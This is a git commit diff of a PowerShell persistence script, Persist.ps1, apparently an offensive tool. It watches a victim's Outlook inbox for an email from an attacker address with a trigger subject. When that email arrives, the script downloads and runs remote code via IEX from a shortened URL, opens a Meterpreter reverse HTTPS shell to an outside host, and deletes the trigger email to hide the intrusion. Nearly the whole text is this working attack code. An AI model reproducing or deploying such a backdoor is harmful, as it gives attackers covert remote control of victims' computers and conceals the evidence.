c13bc3652bc69579ca4df1206749af41d39a7293
enigma0x3 <matthew@webnelson.net>
2014-10-14 13:55:08 -0400

    Update Persist.ps1

--- Persist.ps1
+++ Persist.ps1
@@ -8,12 +8,12 @@ $Emails | foreach {
 if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "TRIGGERTEXT")
 {$WebClientObject = New-Object Net.WebClient
 IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 10.0.0.13 -LPORT 1111 -Force
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.x.xxx -LPORT 1111 -Force
 Return
 
 }}
 $Emails | foreach { 
-if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COMm" -and $_.subject -match "TRIGGERTEXT")
+if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "TRIGGERTEXT")
 {$OutlookFolders = $outlook.Session.Folders.Item(1).Folders
 $EmailInFolderToDelete = $outlook.Session.Folders.Item(1).Folders.Item("Inbox").Items
 $EmailToDelete = $EmailInFolderToDelete | Where-Object {$_.Subject -eq "TRIGGERTEXT" -and $_.SenderEmailAddress -eq "ATTACKEREMAIL@EMAIL.COM"}
